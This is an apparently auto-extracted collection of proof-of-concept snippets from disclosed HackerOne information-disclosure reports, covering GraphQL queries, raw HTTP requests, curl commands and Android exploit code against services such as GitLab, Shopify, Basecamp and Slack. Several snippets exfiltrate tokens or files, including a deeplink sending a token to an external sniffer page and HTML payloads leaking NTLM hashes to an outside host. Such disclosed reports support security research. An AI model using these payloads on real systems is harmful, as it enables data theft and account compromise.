# Information disclosure — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #2032716 An attacker can can view any hacker email via  /SaveCollaboratorsMutation operation name  — security — $12,500 — Information Disclosure
Source: `hackerone/reports/2023/2032716.md` (https://hackerone.com/reports/2032716)

```
POST /graphql HTTP/2
Host: hackerone.com

[sinp]

{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n  saveCollaborators(input: $input) {\n    was_successful\n    errors {\n      edges {\n        node {\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

```
POST /graphql HTTP/2
Host: hackerone.com

[sinp]
```

## #509924 JSON serialization of any Project model results in all Runner tokens being exposed through Quick Actions — gitlab — $12,000 — Information Disclosure
Source: `hackerone/reports/2019/509924.md` (https://hackerone.com/reports/509924)

```
HTTP/1.1 200 OK
Server: nginx
...

{
  "commands_changes": {
    "target_project": {
      "id": 11104317,
      "name": "	█████",
      "path": "█████",
      "description": "",
      "created_at": "2019-03-02T01:39:34.285Z",
      "updated_at": "2019-03-02T01:39:34.285Z",
      "creator_id": 3627572,
      "namespace_id": 4717826,
      "last_activity_at": "2019-03-02T01:39:34.285Z",
      "import_url": null,
      "visibility_level": 0,
      "archived": false,
      "merge_requests_template": null,
      "star_count": 0,
      "merge_requests_rebase_enabled": false,
      "import_type": null,
      "import_source": null,
      "avatar": {
        "url": null
      },
      "approvals_before_merge": 0,
      "reset_approvals_on_push": false,
      "merge_requests_ff_only_enabled": false,
      "issues_template": null,
      "mirror": false,
      "mirror_user_id": null,
      "ci_id": null,
      "shared_runners_enabled": true,
      "runners_token": "mzssqx69THU██████████",
      "build_coverage_regex": null,
      "build_allow_git_fetch": true,
      "build_timeout": 3600,
      "mirror_trigger_builds": false,
      "public_builds": true,
      "pending_delete": false,
      "last_repository_check_failed": null,
      "last_repository_check_at": null,
      "container_registry_enabled": true,
      "only_allow_merge_if_pipeline_succeeds": false,
      "has_external_issue_tracker": false,
      "repository_storage": "nfs-file28",
      "request_access_enabled": false,
   
```

```
    "target_project": {
      "id": 11104317,
      "name": "	█████",
      "path": "█████",
      "description": "",
      "created_at": "2019-03-02T01:39:34.285Z",
      "updated_at": "2019-03-02T01:39:34.285Z",
      "creator_id": 3627572,
      "namespace_id": 4717826,
      "last_activity_at": "2019-03-02T01:39:34.285Z",
      "import_url": null,
      "visibility_level": 0,
      "archived": false,
      "merge_requests_template": null,
      "star_count": 0,
      "merge_requests_rebase_enabled": false,
      "import_type": null,
      "import_source": null,
      "avatar": {
        "url": null
      },
      "approvals_before_merge": 0,
      "reset_approvals_on_push": false,
      "merge_requests_ff_only_enabled": false,
      "issues_template": null,
      "mirror": false,
      "mirror_user_id": null,
      "ci_id": null,
      "shared_runners_enabled": true,
      "runners_token": "mzssqx69THU██████████",
      "build_coverage_regex": null,
      "build_allow_git_fetch": true,
      "build_timeout": 3600,
      "mirror_trigger_builds": false,
      "public_builds": true,
      "pending_delete": false,
      "last_repository_check_failed": null,
      "last_repository_check_at": null,
      "container_registry_enabled": true,
      "only_allow_merge_if_pipeline_succeeds": false,
      "has_external_issue_tracker": false,
      "repository_storage": "nfs-file28",
      "request_access_enabled": false,
      "has_external_wiki": false,
      "repository_read_only": 
```

```
    "commands_only": [
      "Commands applied"
    ]
```

## #850447 gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read — gitlab — $10,000 — Information Disclosure
Source: `hackerone/reports/2020/850447.md` (https://hackerone.com/reports/850447)

```
# create test file on gitlab server
echo hello > /tmp/ggg; sudo chown git:git /tmp/ggg

# attacker
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"

{"message":"201 Created"}
```

```
{
  "rewritten_fields": {
    "[package]": "/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/lala.txt539589799"
  },
  "iss": "gitlab-workhorse"
}
```

```
       def allowed_paths
          [
            ::FileUploader.root,
            Gitlab.config.uploads.storage_path,
            JobArtifactUploader.workhorse_upload_path,
            File.join(Rails.root, 'public/uploads/tmp')
          ]
        end
```

## #2107680 AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp — basecamp — $8,868 — Information Disclosure
Source: `hackerone/reports/2023/2107680.md` (https://hackerone.com/reports/2107680)

```
     while true; do curl "████$RANDOM$RANDOM$RANDOM$RANDOM.png?v=1" | python3 rsvgeb.py recover 260x260 - | strings -n 10 | tee -a pizda_hui_govno.txt; done
     
```

```
    ███
    ██████████
    ██████
    █████████
    -----END RSA PRIVATE KEY-----

s3_backup:
  access_key_id: ██████████
  secret_access_key: █████

sns:
  access_key_id: ███████
  secret_access_key: █████

active_record_encryption:
  primary_key: █████████
  deterministic_key: █████████
  key_derivation_salt: █████

new_relic:
  license_key: ██████
```

```
production_s3_primary:
  service: S3
  access_key_id: ███
  secret_access_key: █████
  region: us-east-2
  bucket: ███
  upload:
    storage_class: INTELLIGENT_TIERING

production_s3_replica:
  service: S3
  access_key_id: ████████
  secret_access_key: ███
  region: us-west-2
  bucket: ████████
  upload:
    storage_class: ONEZONE_IA
```

## #125200 Lack of rate limiting on get.uber.com leads to enumeration of promotion codes and estimation of a lower bound on the number of Uber drivers — uber — $3,000 — Information Disclosure
Source: `hackerone/reports/2016/125200.md` (https://hackerone.com/reports/125200)

```
For an example of each of the possible responses, see the two below links: 

`https://get.uber.com/invite/v1m8a`

`https://get.uber.com/invite/v1m8u`

A simple (but inefficient) way of exploiting this is with a simple python program like this (I have not tested the below code): 
```

```
    if "free gift from" in requests.get("https://get.uber.com/invite/"+code).content:
        return True
    return False
```

```
    for secondChar in characters: 
        for thirdChar in characters:
            for fourthChar in characters:
                for fifthChar in characters:
                    if isAccount(firstChar + secondChar + thirdChar + fourthChar + fifthChar):
                        numAccounts += 1
```

## #715192 Private program disclosure via `vpn_suspended` GraphQL query — security — $2,500 — Information Disclosure
Source: `hackerone/reports/2019/715192.md` (https://hackerone.com/reports/715192)

```
{"query":"query Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!) {team(handle:$handle_0) {id,...F0}} fragment F0 on Team {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,vpn_enabled,vpn_suspended,base_bounty}","variables":{"handle_0":"█████","size_1":"small"}}
```

```
{"data":{"team":{"id":"███","name":"████████","about":"███████","_profile_picturePkPpF":"█████","offers_swag":null,"offers_bounties":null,"vpn_enabled":null,"vpn_suspended":true,"base_bounty":null}}}
```

## #968165 Disclose customer orders details by shopify chat application. — shopify — $2,500 — Information Disclosure
Source: `hackerone/reports/2022/968165.md` (https://hackerone.com/reports/968165)

```
POST /api/storefront/conversations/lx9vF-DR31d1ePOOCS0Uw2lFUUBjhNqmMTOdkeM631M/order_lookup HTTP/1.1
Host: shopify-chat.shopifycloud.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://okbay44.myshopify.com/
Content-Type: application/json
X-Shopify-Chat-Shop-Identifier: █████████
Origin: https://okbay44.myshopify.com
Content-Length: 113
DNT: 1
Connection: close

{"order_lookup":{"email":"@gmail.com","order_number":"1005","user_token":"███"}}
```

## #493176 Partial report contents leakage - via HTTP/2 concurrent stream handling — security — $2,500 — Information Disclosure
Source: `hackerone/reports/2021/493176.md` (https://hackerone.com/reports/493176)

```
{
    "numCorrectBaseline": [11, 10, 9, 8, 6, 9, 10, 6, 10, 11],
    "numCorrectTarget": [15, 18, 14, 16, 15, 16, 14, 13, 16, 20]
}
```

```
    "numCorrectBaseline": [11, 10, 9, 8, 6, 9, 10, 6, 10, 11],
    "numCorrectTarget": [15, 18, 14, 16, 15, 16, 14, 13, 16, 20]
```

## #1085332 [h1-2102] shopApps query from the graphql at /users/api returns all existing created apps, including private ones — shopify — $1,900 — Information Disclosure
Source: `hackerone/reports/2022/1085332.md` (https://hackerone.com/reports/1085332)

```
{"query":"query xxx { shopApps(first:10000) { edges { node { id isPrivate handle name title shopifyApiClientId } } } }"}
```

## #2244229 Cross-Domain Leakage of X Username / UserID due to  Dynamically Generated JS File — x — $1,500 — Information Disclosure
Source: `hackerone/reports/2024/2244229.md` (https://hackerone.com/reports/2244229)

```
self.__INITIAL_STATE__ = {"userId":"█████"};
```

## #961929 Ability to see password protected content by bypassing the password page of shopify preview URL for new development stores (as of August 17, 2020) — shopify — $1,500 — Information Disclosure
Source: `hackerone/reports/2020/961929.md` (https://hackerone.com/reports/961929)

```
 All newly created development stores are password protected. This means that visitors to development stores can access your development store in the following ways only:

    1. By entering a password on the development store password page
    2. By logging into the development store's admin
    3. Through a Shopify Theme Store or Shopify App Store demo link
       Unlike the customizable password page for a store that's on a free trial or paid plan, the development store password page isn't linked to the online 
       store's theme and can't be customized.

 You can remove the password page only after you transfer the store to a merchant or switch the store to a paid plan.
```

```
    1. By entering a password on the development store password page
    2. By logging into the development store's admin
    3. Through a Shopify Theme Store or Shopify App Store demo link
       Unlike the customizable password page for a store that's on a free trial or paid plan, the development store password page isn't linked to the online 
       store's theme and can't be customized.
```

## #882412 OrderListInitial leaks order details — shopify — $1,500 — Information Disclosure
Source: `hackerone/reports/2020/882412.md` (https://hackerone.com/reports/882412)

```
POST /admin/internal/web/graphql/core HTTP/1.1
{"operationName":"OrderListInitial","variables":{},"query":"query OrderListInitial {\n  localDeliveryEnabled\n  shop {\n    id\n    ordersDelayedSince\n    appLinks(type: ORDERS, location: INDEX) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    appActions: appLinks(type: ORDERS, location: ACTION) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    plan {\n      trial\n      __typename\n    }\n    showInstallMobileAppBanner\n    features {\n      fraudProtectEligibility\n      eligibleForBulkLabelPurchase\n      __typename\n    }\n    currencyCode\n    __typename\n  }\n  locationsExist: locations(first: 2, includeLegacy: true) {\n    edges {\n      node {\n        id\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  ordersAll: orders(first: 1, reverse: true) {\n    edges {\n      node {\n        id\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

and the response is below.
```

## #143935 [sms-be-vip.twitter.com] vulnerable to Jetleak — x — $1,260 — Information Disclosure
Source: `hackerone/reports/2018/143935.md` (https://hackerone.com/reports/143935)

```
GET / HTTP/1.1
Host: sms-be-vip.twitter.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close

HTTP/1.1 200 OK
```

## #1054382 HTML Injection in Swing can disclose netNTLM hash or cause DoS — portswigger — $1,000 — Information Disclosure
Source: `hackerone/reports/2021/1054382.md` (https://hackerone.com/reports/1054382)

```
GET /burpsuite_leak_vuln-leak_impact.html?=<html><img+src='http://www.rec2.ml/leak'> HTTP/1.1
```

```
POST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

=<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>
```

```
?=<html><img+src='http://www.rec2.ml/leak'>
```

## #1021885 Bypass of image rewriting / tracking blocker via srcset — basecamp — $1,000 — Information Disclosure
Source: `hackerone/reports/2020/1021885.md` (https://hackerone.com/reports/1021885)

```
    <!DOCTYPE html SYSTEM "https://example.com/log?doctype">
    <html xmlns="http://www.w3.org/1999/xhtml" manifest="https://example.com/log?html-manifest">
    <head profile="https://example.com/log?head-profile">
    </head>
    <body>
    <picture>
        <img srcset="https://example.com/log?picture-img-srcset">
    </picture>
    <img srcset=",,,,,https://example.com/log?img-srcset">
    </body>
    </html>
```

```
    <html style="[...]"><head>
          <meta charset="UTF-8">
          <style>
            [...]
          </style>
          <style>@import url("https://production.haystack-assets.com/assets/message_content-1f242d41450daac108bc715557eebc198d06b738e4e50d3f1005cba03d186861.css");</style>
        </head><body><div class="message-content-inner"><div class="trix-content">
      <div class="__body">
        <p>
           <img srcset="https://example.com/log?picture-img-srcset">
          
          <img srcset=",,,,,https://example.com/log?img-srcset">
          testtest
        </p>
      </div>
    </div>
    </div></body></html>
```

## #917875 STAFF "No-Permissions" on the Store can retrieve the details Order via exchangeReceiptSend — shopify — $1,000 — Information Disclosure
Source: `hackerone/reports/2020/917875.md` (https://hackerone.com/reports/917875)

```
POST https://langduvnsec.myshopify.com/admin/api/unversioned/graphql HTTP/1.1
X-Shopify-Access-Token: xxxxxxxxxxxxxxxxxxxxxxxx
user-agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M.G955NKSU1AQDC) Shopify POS 3.50.0/22606
Accept: application/json
Content-Type: application/json; charset=utf-8
Content-Length: 456
Host: langduvnsec.myshopify.com
Connection: Keep-Alive
Accept-Encoding: gzip

{ "query": "fragment ExchangeErrorFragment on ExchangeError { __typename code field message } mutation ExchangeReceiptSend($exchangeId: ID!, $input: ExchangeReceiptSendRecipientInput!) { __typename exchangeReceiptSend(exchangeId: $exchangeId, recipient: $input) { __typename exchange { __typename id } userErrors { __typename ... ExchangeErrorFragment } } }", "variables": {"exchangeId":"gid://shopify/Exchange/605028374","input":{"phone":"+84332947000"}}}
```

```
{
  "data": {
    "__typename": "Mutation",
    "exchangeReceiptSend": {
      "__typename": "ExchangeReceiptSendPayload",
      "exchange": {
        "__typename": "Exchange",
        "id": "gid://shopify/Exchange/605028374"
      },
      "userErrors": []
    }
  },
  "extensions": {
    "cost": {
      "requestedQueryCost": 10,
      "actualQueryCost": 10,
      "throttleStatus": {
        "maximumAvailable": 300000.0,
        "currentlyAvailable": 299990,
        "restoreRate": 15000.0
      }
    }
  }
}
```

```
pVCSdKiitos, ett teit vaihdoit ostoksen kaupasta langduvnsec!  Alkuperinen tilaus:  langduvnsec.myshopify.com/26192052246/orders/8356d9c67229a59ae4634b94d514d548/authenticate?key=bbf35fac2c88bc3bd6b53cc14e2110f3 Uusi tilaus:  langduvnsec.myshopify.com/26192052246/orders/02418bf7e3604d4c5a09aba909193dc8/authenticate?key=38a448bc14b62c4cff031eb97e6ac186asfo
```

## #126109 CSV Injection in business.uber.com — uber — $1,000 — Information Disclosure
Source: `hackerone/reports/2016/126109.md` (https://hackerone.com/reports/126109)

```
1. It allows for data exfiltration through HYPERLINKs
2. It allows for code execution on the user's machine provided that they trust Uber

1 can be done by setting one's username to something of the form:  
```

```
2 can be done by setting one's username to something of the form: 
```

## #419883 H1514 [beerify.shopifycloud.com] GraphQL discloses internal beer consumption — shopify — $802.20 — Information Disclosure
Source: `hackerone/reports/2019/419883.md` (https://hackerone.com/reports/419883)

```
POST /graphql HTTP/1.1
Host: beerify.shopifycloud.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/json
Cookie: _y=36f02e8b-0639-47BB-8F16-B17F7ED46D62; _shopify_y=36f02e8b-0639-47BB-8F16-B17F7ED46D62; _shopify_fs=2018-10-02T22%3A40%3A00.828Z; master_device_id=fc39122b-3f8d-4407-a889-e8090ce47540; _s=3776a811-97F6-43EF-EDB5-757C5727133E; _shopify_s=3776a811-97F6-43EF-EDB5-757C5727133E; _shopify_sa_t=2018-10-03T01%3A12%3A12.231Z; _shopify_sa_p=
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1, 127.0.01, 127.0.0.1
X-HackerOne: Shopify
Content-Length: 69

{"query": "query allLocations{allLocations{address, code, contact}}"}
```

```
HTTP/1.1 200 OK
Server: nginx/1.15.4
Date: Fri, 05 Oct 2018 23:13:45 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
X-Cusco-Version: 0.4.10
ETag: W/"fb29943639fffbdc10edcc9fcc2645bc"
Cache-Control: max-age=0, private, must-revalidate
X-Request-Id: 77418b20cbbea262c662e9af85afdfa3
X-Runtime: 0.013611
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Dc: gke
X-Dc: gke
Content-Length: 152

{"data":{"allLocations":[{"address":"150 Elgin Street, Ottawa, ON, Canada, K2P1L4","code":"OTT150, 8th Floor","contact":"Alana Plomp (@alana.plomp)"}]}}
```

```
{"query": "query location{location(code:\"OTT150, 8th Floor\"){taps{edges{node{percentRemaining, beer{brewery, ibu, style, tastingNotes, beerLogo, abv}}}}}}"}
```

## #697512 Information Disclosure through Sentry Instance ███████ — eternal — $750 — Information Exposure Through Debug Information
Source: `hackerone/reports/2019/697512.md` (https://hackerone.com/reports/697512)

```
POST /api/20/store██████ HTTP/1.1
Host: ███
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
██████
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Sec-Fetch-Site: none
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
5-go to response and click in the [Render ] to view disclosure UI 
6- i get alot of information disclosure ███(see my screenns) i think the server behind this is [███] with ███

## Impact
```

## #377107 Possible to steal any protected files on Android — owncloud — $750 — Information Disclosure
Source: `hackerone/reports/2021/377107.md` (https://hackerone.com/reports/377107)

```
        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
        StrictMode.setVmPolicy(builder.build());
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("com.owncloud.android", "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
        intent.setType("*/*");
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
        startActivity(intent);
```

## #532225 [Zomato Order] Insecure deeplink leads to sensitive information disclosure — eternal — $750 — None
Source: `hackerone/reports/2021/532225.md` (https://hackerone.com/reports/532225)

```
Follow the code
public class com.application.zomato.activities.DeepLinkRouter extends BaseAppCompactActivity {
public void onCreate(Bundle arg4) {
        super.onCreate(arg4);
        this.setContentView(0x7F0B04D2);
 if((TextUtils.isEmpty(this.c)) && this.getIntent() != null && this.getIntent().getAction() != null && ("android.intent.action.VIEW".equals(this.getIntent().getAction()))) {
            this.c = this.getIntent().getData().toString();
        }
        this.e(this.c);// getting zomatodelivery://etc URL
//..
private void e(String arg11) {
v0 = Uri.parse(arg11);
            if(!"zomato".equals(v0.getScheme()) && !"zomatodelivery".equals(v0.getScheme())) {
                return;
            }
            v1 = v0.getHost();
 if("zloyaltywebview".equals(v1)) {
                            if(TextUtils.isEmpty(v0.getQueryParameter("url"))) {
                                goto label_1496;
                            }
                            if(v0.getQueryParameter("navigation_bar_type") != null) {
                                if(!v0.getQueryParameter("navigation_bar_type").equalsIgnoreCase("transparent")) {
                                }
                                else {
                                    this.a(v0);//without check host
                                    goto label_1496;
                                }
                            }

                            this.g(v0);//with check host
                            goto label_1496
```

```
  Intent intent = new Intent("android.intent.action.VIEW");
  intent.setData(Uri.parse("zomatodelivery://zloyaltywebview/?url=██████████sniffer.php&navigation_bar_type=transparent"));
  startActivity(intent);
```

```
<a href="zomatodelivery://zloyaltywebview/?url=████sniffer.php&navigation_bar_type=transparent">Send token Zomato</a>
```

## #185862 Twitter for android is exposing user's location to any installed android app — x — $560 — Information Disclosure
Source: `hackerone/reports/2017/185862.md` (https://hackerone.com/reports/185862)

```
paramLocation = new Intent("com.twitter.library.geo.LOCATION_CHANGED").putExtra("com.twitter.library.geo.LOCATION_EXTRA", paramLocation);
this.c.sendBroadcast(paramLocation);
```

## #800109 An invite-only's program submission state is accessible to users no longer part of the program — security — $500 — Information Disclosure
Source: `hackerone/reports/2020/800109.md` (https://hackerone.com/reports/800109)

```
          GET /reports/519502.json HTTP/1.1
          Host: hackerone.com
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
          Accept: application/json, text/javascript, */*; q=0.01
          Accept-Language: en-US,en;q=0.5
          Accept-Encoding: gzip, deflate
          Referer: https://hackerone.com/reports/519502
          X-Requested-With: XMLHttpRequest
          Cookie: __cfduid=████████; _cfuid=█████; _ga=█████████; _mkto_trk=███████; _biz_uid=███████; _biz_nA=14; _biz_pendingA=%5B%5D; _biz_flagsA=████████; __Host-session=█████████████; _gid=GA1.2.1121101145.1582021374
          Connection: close
          Cache-Control: max-age=0
```

```
          "team":{"id":██████,"url":"https://hackerone.com/███","handle":"██████████","profile_picture_urls":{"small":"█████████","medium":"████},"permissions":[],"submission_state":"open"
```

```
          GET /reports/668433.json HTTP/1.1
          Host: hackerone.com
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
          Accept: application/json, text/javascript, */*; q=0.01
          Accept-Language: en-US,en;q=0.5
          Accept-Encoding: gzip, deflate
          Referer: https://hackerone.com/reports/668433
    ███████
          X-Requested-With: XMLHttpRequest
    ██████████
          Connection: close
```

## #417170 Using GraphQL, STAFF with NO explicit permissions on Store can retrieve Shopify Payments Balance. — shopify — $500 — Information Disclosure
Source: `hackerone/reports/2019/417170.md` (https://hackerone.com/reports/417170)

```
POST /admin/api/graphql HTTP/1.1
Host: vir444.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
x-shopify-web-force-proxy: 1
origin: https://vir444.myshopify.com
Content-Length: 2999
Cookies: [....]

{"operationName":"HomeIndex","variables":{"localTime":"22:59"},"query":"query HomeIndex($localTime: DateTime!) {\n  staffMember {\n    id\n    privateData {\n      activityFeed(first: 3) {\n        edges {\n          ...ActivityFeed\n          __typename\n        }\n        __typename\n      }\n      capital {\n        ... on HomeCapitalSummary {\n          ...CapitalFeature\n          __typename\n        }\n        __typename\n      }\n      greeting(clientDatetime: $localTime) {\n        body\n        heading\n        __typename\n      }\n      notifications {\n        ... on HomeNotification {\n          ...Notifications\n          __typename\n        }\n        __typename\n      }\n      onboarding {\n        ... on HomeOnboarding {\n          ...Onboarding\n          __typename\n        }\n        __typename\n      }\n      tasks {\n        ... on HomeTask {\n          ...OrderTasks\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  shop {\n    betaOnboarding: beta(name: \"home_onboarding_web\")\n    betaSlice: beta(name: \"home_slice\")\n    email\n
```

```
{
    "data": {
        "shop": {
            "betaSlice": true, 
            "__typename": "Shop", 
            "features": {
                "__typename": "ShopFeatures", 
                "storefront": true
            }, 
            "shopifyPaymentsAccount": {
                "__typename": "ShopifyPaymentsAccount", 
                "payouts": {
                    "__typename": "ShopifyPaymentsPayoutConnection", 
                    "edges": []
                }, 
                "balance": []
            }, 
            "betaOnboarding": true, 
            "id": "gid://shopify/Shop/5282726001", 
            "email": "a@gmail.com"
        }, 
```

```
POST /admin/api/graphql HTTP/1.1
Host: vir444.myshopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/json
x-shopify-web-force-proxy: 1
origin: https://vir444.myshopify.com
Content-Length: 2999
Cookies: [....]

{"operationName":"HomeIndex","variables":{"localTime":"22:59"},"query":"query HomeIndex($localTime: DateTime!) {\n  staffMember {\n    id\n    privateData {\n      activityFeed(first: 3) {\n        edges {\n          ...ActivityFeed\n          __typename\n        }\n        __typename\n      }\n      capital {\n        ... on HomeCapitalSummary {\n          ...CapitalFeature\n          __typename\n        }\n        __typename\n      }\n      greeting(clientDatetime: $localTime) {\n        body\n        heading\n        __typename\n      }\n      notifications {\n        ... on HomeNotification {\n          ...Notifications\n          __typename\n        }\n        __typename\n      }\n      onboarding {\n        ... on HomeOnboarding {\n          ...Onboarding\n          __typename\n     
```

## #689997 Disclosure of Email title report in quick award paypout email (no content mode) — security — $500 — Information Disclosure
Source: `hackerone/reports/2019/689997.md` (https://hackerone.com/reports/689997)

```
curl "https://api.hackerone.com/v1/programs/42738/bounties" \
  -X POST \
  -u "dummy:xxxxxxxx" \
  -H "Content-Type: application/json" \
  -d @- <<EOD
    {
      "data": {
        "type": "bounty",
        "attributes": {
          "amount": 100,
          "reference": "aaaaa",
          "title": "SQL injection in example.com",
          "recipient": "example@example.com",
          "currency": "USD",
          "severity_rating": "high"
        }
      }
    }
EOD
```

```
    {
      "data": {
        "type": "bounty",
        "attributes": {
          "amount": 100,
          "reference": "aaaaa",
          "title": "SQL injection in example.com",
          "recipient": "example@example.com",
          "currency": "USD",
          "severity_rating": "high"
        }
      }
    }
```

## #1219011 Report Bulk endpoint "agree-on-going-public" action may reveal Report disclosure state for invite-only programs — security — $500 — Information Disclosure
Source: `hackerone/reports/2021/1219011.md` (https://hackerone.com/reports/1219011)

```
POST /reports/bulk HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/bugs?subject=user&report_id=901468&view=pending_disclosure&filters%5B%5D=not-public&filters%5B%5D=going-public-user&filters%5B%5D=going-public-team&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
X-CSRF-Token: ██████
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 184
Origin: https://hackerone.com
Connection: close
Cookie: █████
Sec-GPC: 1

message=hi&reference=&add_reporter_to_original=true&reply_action=cancel-disclosure-request&mark_ineligible_for_bounty=false&reports_count=1&report_ids%5B%5D=1078081&bounty_currency=USD
```

```
                                                                                                                                    SUMMARY
```

```
                               "{"flash":"The request to disclose the report has been cancelled."}"
```

## #375083 Private application files can be uploaded to Slack via malicious uploader — slack — $500 — Information Disclosure
Source: `hackerone/reports/2021/375083.md` (https://hackerone.com/reports/375083)

```
private static boolean isPrivateFile(Uri uri) {
        return uri.getPathSegments().contains("com.Slack");
    }
```

```
 StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
    StrictMode.setVmPolicy(builder.build());
    new File("/data/data/com.example.route.readfileapk/").setReadable(true,false);
    new File("/data/data/com.example.route.readfileapk/").setWritable(true,false);
    new File("/data/data/com.example.route.readfileapk/").setExecutable(true,false);
   
       try {
            Runtime.getRuntime().exec("ln -s /data/data/com.Slack/databases/account_manager /data/data/com.example.route.readfileapk/account_manager").waitFor();
        }
        catch(Exception e) {
            e.printStackTrace();
            finish();
            return;
        }
        new File("/data/data/com.example.route.readfileapk/account_manager").setReadable(true,false);
        Intent intent = new Intent("android.intent.action.SEND");
        intent.setClassName("com.Slack", "com.Slack.ui.UploadActivity");
        intent.setType("*/*");
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        intent.putExtra("android.intent.extra.STREAM", Uri.parse("file:///data/data/com.example.route.readfileapk/account_manager"));
        startActivity(intent);
```

```
        return uri.getPathSegments().contains("com.Slack");
    }
```

## #159526 Information leakage of private program — security — $500 — Information Disclosure
Source: `hackerone/reports/2016/159526.md` (https://hackerone.com/reports/159526)

```
GET /programs/search?query█████████&sort=published_at%3Adescending&page=1 HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,bn;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
X-CSRF-Token: <redacted>
X-Requested-With: XMLHttpRequest
Referer: https://hackerone.com/directory?query█████████
Cookie: <redacted>
Connection: close
```

```
{"id":1913,"url":"/██████████","name":"████","meta":{"bug_count":5,"minimum_bounty":100,"soft_launched":true},"about":"","handle":"██████████","profile_picture":"https://profile-photos.hackerone-user-content.com/production/████████","internet_bug_bounty":false}
```

```
GET /programs/search?query█████████&sort=published_at%3Adescending&page=1 HTTP/1.1
Host: hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-GB,bn;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
